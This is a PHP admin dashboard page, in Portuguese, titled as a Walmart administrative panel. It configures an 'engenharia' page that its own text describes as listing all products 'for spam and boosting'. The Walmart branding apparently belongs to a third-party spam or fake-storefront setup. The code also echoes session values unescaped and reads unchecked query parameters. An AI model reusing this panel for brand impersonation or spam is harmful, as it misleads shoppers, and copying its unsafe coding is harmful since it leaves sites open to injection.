<?php

error_reporting(0);
ini_set(“display_errors”, 0 );


ob_start();
session_start();


if(isset($_SESSION['nome_a']))
	{

require_once ("function/config.php");
require_once ("function/conexao.php");



$dadosB = "SELECT* FROM configuracao where id=1";
$conB = $mysqli -> query($dadosB) or die ($mysqli -> error);


while ($consultaB= $conB -> fetch_array()){
	
	$id = $consultaB ["id"];
	$link_site = $consultaB ["link_site"];
	$email = $consultaB ["email"];
	
	
	
}




$dados2 = "SELECT* FROM configuracao ";
$con2 = $mysqli -> query($dados2) or die ($mysqli -> error);






?>





<!DOCTYPE html>
<!--[if IE 9 ]><html class="ie9"><![endif]-->
    
<!-- Mirrored from byrushan.com/projects/sa/1-0-3/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 24 Oct 2017 19:43:29 GMT -->
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
        <meta name="format-detection" content="telephone=no">
        <meta charset="UTF-8">

        <meta name="description" content="Violate Responsive Admin Template">
        <meta name="keywords" content="Super Admin, Admin, Template, Bootstrap">

        <title>PAINEL ADMINISTRATIVO - WALMART - ZEDN</title>
            
        <!-- CSS -->
        <link href="css/bootstrap.min.css" rel="stylesheet">
        <link href="css/animate.min.css" rel="stylesheet">
        <link href="css/font-awesome.min.css" rel="stylesheet">
        <link href="css/form.css" rel="stylesheet">
        <link href="css/calendar.css" rel="stylesheet">
        <link href="css/style.css" rel="stylesheet">
        <link href="css/icons.css" rel="stylesheet">
        <link href="css/generics.css" rel="stylesheet"> 
    </head>
    <body id="skin-blur-violate">

        <header id="header" class="media">
            <a href="#" id="menu-toggle"></a> 
            <a class="logo pull-left" href="index.php">Bem Vindo , <?php echo $_SESSION['nome_a'] ?> </a>
            
            <div class="media-body">
                <div class="media" id="top-menu">
    
         

                    

                    <div id="time" class="pull-right">
                        <span id="hours"></span>
                        :
                        <span id="min"></span>
                        :
                        <span id="sec"></span>
                    </div>
                    
                  
                </div>
            </div>
        </header>
        
        
        <section id="main" class="p-relative" role="main">
            
            <!-- Sidebar -->
            <aside id="sidebar">
                
                <!-- Sidbar Widgets -->
                <div class="side-widgets overflow">
                    <!-- Profile Menu -->
                    <div class="text-center s-widget m-b-25 dropdown" id="profile-menu">
                        <a href="#" data-toggle="dropdown">
                            <img class="profile-pic animated" src="img/profile-pic.jpg" alt="">
                        </a>

                        <h4 class="m-0"><?php echo $_SESSION['nome_a'] ?></h4>
                    </div>
                    
                    <!-- Calendar -->
                    <div class="s-widget m-b-25">
                        <div id="sidebar-calendar"></div>
                    </div>
                    
                    <!-- Feeds -->
                    <div class="s-widget m-b-25">
                        <h2 class="tile-title">
                           Atualizações
                        </h2>
                        
						<iframe  frameborder='0' src="check.html" src="frame.php" width="200" height="100"  ></iframe>

						
						
						
                        <div class="s-widget-body">
                            <div id="news-feed"></div>
                        </div>
                    </div>
                    
                    <!-- Projects -->

                </div>
                
                <!-- Side Menu -->
                <ul class="list-unstyled side-menu">
                   
                </ul>

            </aside>
        
            <!-- Content -->
            <section id="content" class="container">
            
              

                
                <h4 class="page-title">DASHBOARD</h4>
                                
                             
                <!-- Shortcuts -->
                <div class="block-area shortcut-area">
                    <a class="shortcut tile" href="mods.php">
                        <img src="img/shortcuts/money.png" alt="">
                        <small class="t-cog">Produtos</small>
                    </a>
					
					 <a class="shortcut tile" href="info.php">
                        <img src="img/shortcuts/money.png" alt="">
                        <small class="t-cog">Infos</small>
                    </a>
					
                    <a class="shortcut tile" href="index.php">
                        <img src="img/shortcuts/twitter.png" alt="">
                        <small class="t-overflow">Configurações</small>
                    </a>
					<a class="shortcut tile" href="index.php">
                        <img src="img/shortcuts/engenharia.png" alt="">
                        <small class="t-overflow">Inicio</small>
                    </a>
					
					
					<a class="shortcut tile" href="logout.php">
                        <img src="img/shortcuts/off.png" alt="">
                        <small class="t-overflow">Deslogar</small>
                    </a>
					
					

                
                <hr class="whiter" />
  
		
		

	<form action="function/edit_eng.php" method="post"  >
	
                <div class="block-area" id="text-input">
				
				<?php if ( $_GET ['status'] == 1) { ?>
					
                    <div class="alert alert-success alert-icon">
                        <strong>Sucesso ao alterar a engenharia.</strong>
                        <i class="icon">&#61845;</i>
                    </div>
	<?php } if( $_GET ['status'] == 2) { ?>
					
					                   
                    <div class="alert alert-danger alert-icon">
                        <strong> Falha ao alterar a engenharia.</strong>
                        <i class="icon">&#61907;</i>
                    </div>
					
					<?php } ?>
	

				
				<strong> A engenharia é uma página com todos seus produtos adicionados em uma página só para spam e impulsionamento. Você pode limitar a quantidade de produtos e escolher exibir o preço ou não.</strong>
				<br>
				<br>

                    <p></p>
                    <p>Deseja tornar a engenharia como inicio da sua tela ?</p>

        <select name="alterna" class="form-control input-sm m-b-10">
                        <option  value="1">Sim</option>
                        <option  value="2"> Não</option>
                    </select> 
					
					
					  <p>Exibir o preço dos produtos na engenharia ?</p>

        <select name="exibi" class="form-control input-sm m-b-10">
                        <option  value="1">Sim</option>
                        <option  value="2"> Não</option>
                    </select> 
					
					
					
                   <p>Quantidade de produtos a exibir</p>
 
                    <input required class="form-control input-focused" name="quantidade" type="text" value=""><br> 

                </div>		
		

  

		
		
		 <div class="block-area" id="block-level">
                     <button class="btn btn-block btn-alt">Atualizar Configurações</button><br></br>
                </div>
		</center>
		
		</form>
                  
                
                     <a target="_blank" href="code.php" ><button class="btn btn-block btn-alt">Visualizar Engenharia</button></a><br></br>

            </section>


        </section>
        
        <!-- Javascript Libraries -->
        <!-- jQuery -->
        <script src="js/jquery.min.js"></script> <!-- jQuery Library -->
        <script src="js/jquery-ui.min.js"></script> <!-- jQuery UI -->
        <script src="js/jquery.easing.1.3.js"></script> <!-- jQuery Easing - Requirred for Lightbox + Pie Charts-->

        <!-- Bootstrap -->
        <script src="js/bootstrap.min.js"></script>

        <!-- Charts -->
        <script src="js/charts/jquery.flot.js"></script> <!-- Flot Main -->
        <script src="js/charts/jquery.flot.time.js"></script> <!-- Flot sub -->
        <script src="js/charts/jquery.flot.animator.min.js"></script> <!-- Flot sub -->
        <script src="js/charts/jquery.flot.resize.min.js"></script> <!-- Flot sub - for repaint when resizing the screen -->
        <script src="js/fileupload.min.js"></script> <!-- File Upload -->

        <script src="js/sparkline.min.js"></script> <!-- Sparkline - Tiny charts -->
        <script src="js/easypiechart.js"></script> <!-- EasyPieChart - Animated Pie Charts -->
        <script src="js/charts.js"></script> <!-- All the above chart related functions -->

        <!-- Map -->
        <script src="js/maps/jvectormap.min.js"></script> <!-- jVectorMap main library -->
        <script src="js/maps/usa.js"></script> <!-- USA Map for jVectorMap -->

        <!--  Form Related -->
        <script src="js/icheck.js"></script> <!-- Custom Checkbox + Radio -->

        <!-- UX -->
        <script src="js/scroll.min.js"></script> <!-- Custom Scrollbar -->

        <!-- Other -->
        <script src="js/feeds.min.js"></script> <!-- News Feeds -->
        

        <!-- All JS functions -->
        <script src="js/functions.js"></script>
    </body>

<!-- Mirrored from byrushan.com/projects/sa/1-0-3/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 24 Oct 2017 19:44:17 GMT -->
</html>


	<?php

	} 
	
	else
		
		{		
			
     ?>
        	Esta é uma área restrita, por favor, <a href="login.php"><strong>efetue login</strong></a>.
        </div>
		<?php 	ob_end_flush();

	}
?>
